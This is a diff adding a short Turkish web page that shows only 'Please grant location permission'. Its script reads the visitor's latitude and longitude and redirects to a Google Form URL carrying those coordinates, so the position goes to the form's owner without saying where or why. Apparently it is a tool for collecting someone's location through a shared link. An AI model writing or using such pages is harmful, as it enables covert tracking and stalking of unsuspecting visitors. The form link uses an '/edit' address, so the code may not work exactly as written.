@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Konum Alınıyor...</title>
+</head>
+<body>
+  <h3>Lütfen konum izni veriniz...</h3>
+
+  <script>
+    const formLink = "https://docs.google.com/forms/d/1_RdB0Zv8zSQe6kmbYYltJr75PpXuOaXliMHLFxt9wtg/edit";
+    const entryId = "entry.1414311412";
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const locationValue = lat + ", " + lon;
+
+          const redirectUrl =
+            formLink + "?" + entryId + "=" + encodeURIComponent(locationValue);
+
+          window.location.href = redirectUrl;
+        },
+        function(error) {
+          alert("Konum alınamadı. Lütfen izin veriniz.");
+        }
+      );
+    } else {
+      alert("Tarayıcınız konum özelliğini desteklemiyor.");
+    }
+  </script>
+</body>
+</html>
+
+konum al sayfası
